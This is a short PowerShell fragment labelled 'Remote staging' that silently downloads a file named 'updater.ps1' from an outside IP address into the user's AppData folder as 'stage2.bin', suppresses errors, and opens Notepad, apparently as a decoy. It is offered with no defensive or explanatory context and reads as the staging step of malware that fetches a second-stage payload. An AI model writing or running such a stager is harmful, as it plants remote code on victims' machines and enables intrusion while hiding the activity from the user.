# Remote staging
$Stage1Url = 'https://203.0.113.54:443/updater.ps1'
$OutputPath = "$env:APPDATA\stage2.bin"
Start-BitsTransfer -Source $Stage1Url -Destination $OutputPath -ErrorAction SilentlyContinue
Start-Process -FilePath "notepad.exe" -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
